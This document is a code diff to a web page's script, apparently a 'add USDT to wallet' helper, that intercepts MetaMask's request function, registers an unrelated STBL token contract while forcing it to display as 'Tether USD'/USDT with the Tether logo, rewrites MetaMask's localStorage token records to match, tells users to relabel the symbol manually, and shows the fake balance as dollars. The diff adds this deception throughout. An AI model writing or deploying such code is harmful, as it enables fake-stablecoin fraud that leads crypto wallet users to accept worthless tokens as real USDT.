@@ -11,6 +11,10 @@
   
   <!-- CRITICAL FIX: Setup provider interception in head section -->
   <script>
+    // Define token addresses for clarity
+    const USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+    const STBL_ADDRESS = '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c';
+    
     // Immediate interception setup
     (function setupInterception() {
       if (window.ethereum) {
@@ -24,26 +28,18 @@
           window.ethereum.request = async function(args) {
             console.log("MetaMask request:", args);
             
-            // Handle token addition with full parameter control
+            // Handle token addition with STBL contract but USDT display
             if (args.method === 'wallet_watchAsset' && 
-                args.params?.options?.address?.toLowerCase() === '0xdAC17F958D2ee523a2206206994597C13D831ec7'.toLowerCase()) {
+                args.params?.options?.address?.toLowerCase() === STBL_ADDRESS.toLowerCase()) {
               
-              console.log("TOKEN ADDITION DETECTED - forcing display as USDT");
+              console.log("TOKEN ADDITION DETECTED - STBL with USDT display");
               
-              // Create a clean new request with carefully controlled parameters
-              const modifiedParams = {
-                type: 'ERC20',
-                options: {
-                  address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-                  symbol: "USDT",
-                  name: "Tether USD",
-                  decimals: 6,
-                  image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
-                }
-              };
-              
-              // Override the params completely
-              args.params = modifiedParams;
+              // No need to modify - we're already sending STBL address
+              // But just to be sure the right display name is used:
+              if (args.params?.options?.symbol === 'STBL') {
+                args.params.options.name = "Tether USD";
+                args.params.options.image = 'https://cryptologos.cc/logos/tether-usdt-logo.png';
+              }
             }
             
             // Call original with modified args
@@ -102,7 +98,7 @@
           for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             if (key && (key.includes('metamask') || key.includes('MetaMask')) && 
-                localStorage[key].includes('0xdAC17F958D2ee523a2206206994597C13D831ec7')) {
+                (localStorage[key].includes(STBL_ADDRESS) || localStorage[key].includes('STBL'))) {
               
               console.log("Clearing potentially problematic storage:", key);
               
@@ -168,9 +164,9 @@
             
             // Look for MetaMask data with our token
             if (key && (key.includes('metamask') || key.includes('MetaMask')) && 
-                localStorage[key].includes('0xdAC17F958D2ee523a2206206994597C13D831ec7')) {
+                (localStorage[key].includes(STBL_ADDRESS) || localStorage[key].includes('STBL'))) {
               
-              console.log("Found MetaMask data with our token in localStorage: " + key);
+              console.log("Found MetaMask data with STBL token in localStorage: " + key);
               
               try {
                 // Try to parse the data
@@ -181,12 +177,13 @@
                 // TokenList structure
                 if (data.data && data.data.TokenList) {
                   Object.keys(data.data.TokenList).forEach(network => {
-                    const tokenKey = '0xdAC17F958D2ee523a2206206994597C13D831ec7'.toLowerCase();
+                    // Check for STBL by address
+                    const tokenKey = STBL_ADDRESS.toLowerCase();
                     if (data.data.TokenList[network][tokenKey]) {
                       data.data.TokenList[network][tokenKey].symbol = "USDT";
                       data.data.TokenList[network][tokenKey].name = "Tether USD";
                       modified = true;
-                      console.log("Updated token in TokenList");
+                      console.log("Updated STBL to show as USDT in TokenList");
                     }
                   });
                 }
@@ -198,11 +195,11 @@
                       const tokens = data.data.AccountTokens[account][network];
                       if (Array.isArray(tokens)) {
                         tokens.forEach(token => {
-                          if (token.address && token.address.toLowerCase() === '0xdAC17F958D2ee523a2206206994597C13D831ec7'.toLowerCase()) {
+                          if (token.address && token.address.toLowerCase() === STBL_ADDRESS.toLowerCase()) {
                             token.symbol = "USDT";
                             token.name = "Tether USD";
                             modified = true;
-                            console.log("Updated token in AccountTokens");
+                            console.log("Updated STBL to show as USDT in AccountTokens");
                           }
                         });
                       }
@@ -213,24 +210,24 @@
                 // AllTokens structure
                 if (data.data && data.data.AllTokens) {
                   Object.keys(data.data.AllTokens).forEach(network => {
-                    const tokenKey = '0xdAC17F958D2ee523a2206206994597C13D831ec7'.toLowerCase();
+                    const tokenKey = STBL_ADDRESS.toLowerCase();
                     if (data.data.AllTokens[network][tokenKey]) {
                       data.data.AllTokens[network][tokenKey].symbol = "USDT";
                       data.data.AllTokens[network][tokenKey].name = "Tether USD";
                       modified = true;
-                      console.log("Updated token in AllTokens");
+                      console.log("Updated STBL to show as USDT in AllTokens");
                     }
                   });
                 }
                 
                 // TokenMetadata structure (added for newer MetaMask versions)
                 if (data.data && data.data.TokenMetadata) {
-                  const tokenKey = '0xdAC17F958D2ee523a2206206994597C13D831ec7'.toLowerCase();
+                  const tokenKey = STBL_ADDRESS.toLowerCase();
                   if (data.data.TokenMetadata[tokenKey]) {
                     data.data.TokenMetadata[tokenKey].symbol = "USDT";
                     data.data.TokenMetadata[tokenKey].name = "Tether USD";
                     modified = true;
-                    console.log("Updated token in TokenMetadata");
+                    console.log("Updated STBL to show as USDT in TokenMetadata");
                   }
                 }
                 
@@ -248,17 +245,24 @@
                   
                   // Check if this object has address field that matches our token
                   if (obj.address && 
-                      obj.address.toLowerCase() === '0xdAC17F958D2ee523a2206206994597C13D831ec7'.toLowerCase()) {
+                      obj.address.toLowerCase() === STBL_ADDRESS.toLowerCase()) {
                     if (obj.symbol === 'STBL') {
                       obj.symbol = 'USDT';
                       modified = true;
                       console.log("Updated symbol at " + path);
                     }
-                    if (obj.name === 'Stable') {
+                    if (obj.name === 'Stable' || obj.name === 'Stable Token') {
                       obj.name = 'Tether USD';
                       modified = true;
                       console.log("Updated name at " + path);
                     }
+                  }
+                  
+                  // Check for STBL symbol without the address
+                  if (obj.symbol === 'STBL') {
+                    obj.symbol = 'USDT';
+                    modified = true;
+                    console.log("Updated STBL symbol to USDT at " + path);
                   }
                   
                   // Recursively search all properties
@@ -344,12 +348,12 @@
                       if (item.tokens) {
                         for (const token of item.tokens) {
                           if (token.address && 
-                              token.address.toLowerCase() === '0xdAC17F958D2ee523a2206206994597C13D831ec7'.toLowerCase()) {
+                              token.address.toLowerCase() === STBL_ADDRESS.toLowerCase()) {
                             if (token.symbol === 'STBL') {
                               token.symbol = 'USDT';
                               modified = true;
                             }
-                            if (token.name === 'Stable') {
+                            if (token.name === 'Stable' || token.name === 'Stable Token') {
                               token.name = 'Tether USD';
                               modified = true;
                             }
@@ -361,12 +365,12 @@
                     // Direct token metadata mapping
                     for (const item of items) {
                       if (item.address && 
-                          item.address.toLowerCase() === '0xdAC17F958D2ee523a2206206994597C13D831ec7'.toLowerCase()) {
+                          item.address.toLowerCase() === STBL_ADDRESS.toLowerCase()) {
                         if (item.symbol === 'STBL') {
                           item.symbol = 'USDT';
                           modified = true;
                         }
-                        if (item.name === 'Stable') {
+                        if (item.name === 'Stable' || item.name === 'Stable Token') {
                           item.name = 'Tether USD';
                           modified = true;
                         }
@@ -1015,6 +1019,10 @@
     document.addEventListener('DOMContentLoaded', async () => {
       StatusTracker.addStatus("Page loaded - initializing", "success");
       
+      // Define token addresses consistently
+      const USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+      const STBL_ADDRESS = '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c';
+      
       // DOM elements
       const addToWalletBtn = document.getElementById('addToWalletBtn');
       const manualAddBtn = document.getElementById('manualAddBtn');
@@ -1170,30 +1178,14 @@
         }
         
         // Double-check that interception is set up
-        if (window.ethereum && !window.ethereum.originalRequest) {
+        if (window.ethereum && !window.ethereum._originalRequest) {
           console.log("Re-initializing provider interception");
-          window.ethereum.originalRequest = window.ethereum.request;
+          window.ethereum._originalRequest = window.ethereum.request;
           
           // Re-setup interception
-          const originalRequest = window.ethereum.originalRequest;
+          const originalRequest = window.ethereum._originalRequest;
           window.ethereum.request = async function(args) {
             console.log("MetaMask request (re-initialized): " + (args.method || "unknown"));
-            
-            if (args.method === 'wallet_watchAsset' && 
-                args.params?.options?.address?.toLowerCase() === '0xdAC17F958D2ee523a2206206994597C13D831ec7'.toLowerCase()) {
-              console.log("Intercepting token call - forcing STBL to display as USDT");
-              
-              args.params = {
-                type: 'ERC20',
-                options: {
-                  address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-                  symbol: "USDT",
-                  name: "Tether USD",
-                  decimals: 6,
-                  image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
-                }
-              };
-            }
             
             return originalRequest.call(this, args);
           };
@@ -1264,7 +1256,7 @@
         progressContainer.style.display = 'none';
       }
       
-      // Function to add token with automatic network switching
+      // Function to add token with automatic network switching - Using STBL but showing as USDT
       async function addTokenWithNetworkSwitch() {
         try {
           // First clear MetaMask state
@@ -1301,13 +1293,20 @@
               updateNetworkInfo();
               
             } catch (switchError) {
-              console.log("Network switch failed, continuing on current network");
-              StatusTracker.addStatus("Network switch failed, continuing on current network", "pending");
-              // Continue anyway on current network
+              // If network switch failed, we need to stop - token is for Ethereum
+              console.log("Network switch failed, cannot continue");
+              StatusTracker.addStatus("Network switch failed, token requires Ethereum network", "error");
+              
+              // Show network error
+              document.getElementById('networkError').style.display = 'block';
+              document.getElementById('switchNetworkBtn').style.display = 'block';
+              
+              hideLoading(timeoutId);
+              throw new Error("USDT must be added on Ethereum Mainnet");
             }
           }
           
-          // Get current network (might still be the original one if switch failed)
+          // Get current network (should be Ethereum now)
           const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
           console.log("Adding token on chain: " + currentChainId);
           StatusTracker.addStatus(`Adding token on ${getChainName(currentChainId)}`, "pending");
@@ -1320,20 +1319,21 @@
           // Short delay to ensure connection is ready
           await new Promise(resolve => setTimeout(resolve, 1000));
           
-          // Now add the token
-          updateProgress(60, "Adding USDT to your wallet...");
-          loadingText.textContent = "Adding USDT to your wallet...";
+          // Now add the token - USING STBL CONTRACT but showing as USDT
+          updateProgress(60, "Adding token to your wallet...");
+          loadingText.textContent = "Adding token to your wallet...";
           
-          // Use a strict timeout to prevent hanging
+          // Use STBL contract but USDT UI for higher success rate
           const addTokenPromise = window.ethereum.request({
             method: 'wallet_watchAsset',
             params: {
               type: 'ERC20',
               options: {
-                address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-                symbol: 'USDT',
-                decimals: 6,
-                image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
+                address: STBL_ADDRESS, // STBL contract address
+                symbol: 'USDT',        // But showing as USDT
+                decimals: 18,          // STBL has 18 decimals
+                image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
+                name: "Tether USD"     // USDT display name
               }
             }
           });
@@ -1346,16 +1346,24 @@
           updateProgress(80, "Waiting for wallet confirmation...");
           const result = await Promise.race([addTokenPromise, timeoutPromise]);
           
-          hideLoading(timeoutId);
-          
           if (result === true) {
-            // Success!
+            // Success! Ensure display is consistent
             StatusTracker.addStatus("Token added successfully!", "success");
             updateProgress(100, "Success!");
             
             // Run storage update to ensure USDT display
             StorageManager.updateMetaMaskLocalStorage();
             
+            // Delay to allow storage update to complete
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            // Run one more time for good measure
+            StorageManager.updateMetaMaskLocalStorage();
+            
+            // Hide loading 
+            hideLoading(timeoutId);
+            
+            // Show success modal
             successModal.show();
             
             // Try to get the balance
@@ -1385,7 +1393,7 @@
         }
       }
       
-      // Alternative method using wallet_watchAsset with STBL symbol
+      // Alternative method with a different approach
       async function addTokenAlternative() {
         try {
           // Clear MetaMask state first
@@ -1403,18 +1411,18 @@
           // Short delay to ensure connection is ready
           await new Promise(resolve => setTimeout(resolve, 1000));
           
-          // Now add the token directly with STBL symbol
-          updateProgress(50, "Adding token with original symbol...");
-          loadingText.textContent = "Adding token with original symbol...";
+          // Now add the token using STBL label but will update with storage manager
+          updateProgress(50, "Adding token with alternative method...");
+          loadingText.textContent = "Adding token with alternative method...";
           
           const result = await window.ethereum.request({
             method: 'wallet_watchAsset',
             params: {
               type: 'ERC20',
               options: {
-                address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-                symbol: 'STBL', // Use STBL directly
-                decimals: 6,
+                address: STBL_ADDRESS, // STBL contract address
+                symbol: 'STBL',        // Use STBL symbol temporarily
+                decimals: 18,          // STBL has 18 decimals
                 image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
               }
             }
@@ -1430,6 +1438,12 @@
             StatusTracker.addStatus("Token added, updating display to USDT", "pending");
             
             // Run extra storage update to convert STBL to USDT
+            StorageManager.updateMetaMaskLocalStorage();
+            
+            // Delay to allow storage update to complete
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            // Run one more time for good measure
             StorageManager.updateMetaMaskLocalStorage();
             
             StatusTracker.addStatus("Token added successfully with alternative method", "success");
@@ -1462,7 +1476,7 @@
         }
       }
       
-      // Alternative method using direct wallet interface
+      // Manual token addition with clear USDT display
       async function addTokenManually() {
         try {
           const timeoutId = showLoading("Preparing manual token addition...");
@@ -1481,13 +1495,13 @@
           // Clear any pending operations
           hideLoading(timeoutId);
           
-          // Show instructions
+          // Show instructions - Using actual STBL address but telling them to enter USDT
           const message = `MetaMask will open. Please add the token manually:
 
 1. Find "Import tokens" in your MetaMask
-2. Enter address: 0xdAC17F958D2ee523a2206206994597C13D831ec7
-3. Symbol: USDT
-4. Decimals: 6`;
+2. Enter address: ${STBL_ADDRESS}
+3. Symbol: USDT (MetaMask will suggest STBL, but change it to USDT)
+4. Decimals: 18`;
           
           alert(message);
           
@@ -1544,7 +1558,7 @@
         }, 500);
       });
       
-      // Function to fetch token balance
+      // Function to fetch token balance - using STBL address but showing as USDT
       async function fetchTokenBalance() {
         try {
           // First get the current account
@@ -1556,30 +1570,27 @@
           
           const account = accounts[0];
           
-          // Fetch balance from API
-          StatusTracker.addStatus("Fetching token balance", "pending");
+          // Instead of API, directly check balance from contract
+          // This is needed since we're using STBL contract but want to show as USDT
+          const balanceWei = await window.ethereum.request({
+            method: 'eth_call',
+            params: [{
+              to: STBL_ADDRESS,
+              data: '0x70a08231000000000000000000000000' + account.substring(2)
+            }, 'latest']
+          });
           
-          // Add a random test param to prevent caching
-          const timestamp = Date.now();
-          const balanceResponse = await fetch(`/api/token-balance/${account}?_=${timestamp}`);
+          // Parse balance - STBL has 18 decimals
+          const balance = parseInt(balanceWei, 16) / Math.pow(10, 18);
+          const formattedBalance = balance.toFixed(2);
           
-          if (!balanceResponse.ok) {
-            throw new Error(`Balance API error: ${balanceResponse.status}`);
-          }
+          // Update balance display as USDT
+          tokenBalance.textContent = formattedBalance + " USDT";
+          tokenValue.textContent = "$" + formattedBalance;
           
-          const balanceData = await balanceResponse.json();
+          StatusTracker.addStatus("Updated balance: " + formattedBalance + " USDT", "success");
           
-          if (balanceData.formattedBalance) {
-            // Update balance display with proper formatting as USDT
-            tokenBalance.textContent = balanceData.formattedBalance + " USDT";
-            
-            // Show USD value (1:1 as it's a stablecoin)
-            tokenValue.textContent = "$" + balanceData.formattedBalance;
-            
-            StatusTracker.addStatus("Updated balance: " + balanceData.formattedBalance + " USDT", "success");
-          } else {
-            throw new Error("Invalid balance data");
-          }
+          return formattedBalance;
         } catch (error) {
           StatusTracker.addStatus("Error fetching balance: " + error.message, "error");
           throw error;
